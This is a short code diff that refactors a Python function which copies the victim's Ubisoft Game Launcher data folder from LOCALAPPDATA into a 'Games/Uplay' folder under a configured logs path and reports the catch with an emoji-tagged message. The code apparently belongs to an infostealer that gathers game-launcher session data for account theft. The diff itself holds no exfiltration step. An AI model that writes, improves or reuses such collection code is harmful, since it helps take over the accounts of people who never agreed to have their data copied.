@@ -1,15 +1,13 @@
-from os import sep,environ
+from os import environ
+from os.path import join
 from shutil import copytree
 from manager.logger import Log
 from preferences.config import config
 
 def Ubisoft():
     try:
-        path = r"\Ubisoft Game Launcher"
         msgInfo = ""
-        pathtofile = config.pathToLogs
-        local = environ["LOCALAPPDATA"]
-        copytree(local+ sep + path,f'{pathtofile}\\Games\\Uplay')
+        copytree(join(environ["LOCALAPPDATA"], "Ubisoft Game Launcher"), join(config.pathToLogs, "Games", "Uplay"))
         msgInfo+="\n∟🎮Uplay"
         return msgInfo
     except Exception as error:
